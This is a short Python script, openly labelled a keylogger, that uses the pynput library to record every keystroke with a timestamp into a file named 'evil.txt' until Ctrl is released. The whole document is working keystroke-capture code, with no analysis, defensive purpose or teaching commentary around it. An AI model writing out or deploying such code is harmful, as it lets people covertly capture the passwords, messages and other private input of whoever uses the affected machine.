import logging
import time
from pynput import keyboard

evil = "evil.txt"

logging.basicConfig(filename=evil, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.ctrl:

        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'ctrl' to stop.")
    listener.join()